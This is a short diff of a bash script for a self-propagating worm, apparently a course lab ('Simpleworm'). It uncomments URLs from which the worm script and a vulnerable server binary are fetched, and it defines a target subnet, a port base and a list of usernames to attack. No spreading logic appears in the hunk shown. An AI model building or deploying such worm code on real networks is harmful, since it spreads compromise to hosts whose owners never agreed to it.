@@ -1,8 +1,8 @@
 #!/bin/bash
 
 NETWORK_PREFIX="192.168.42"
-# VULSERVER_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/vulserver"
-# WORM_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh"
+VULSERVER_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/vulserver"
+WORM_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh"
 PORT_BASE=4445
 USERNAMES=("ubuntu" "server" "victim" "client")
 ME=$(hostname -I | awk '{print $1}')
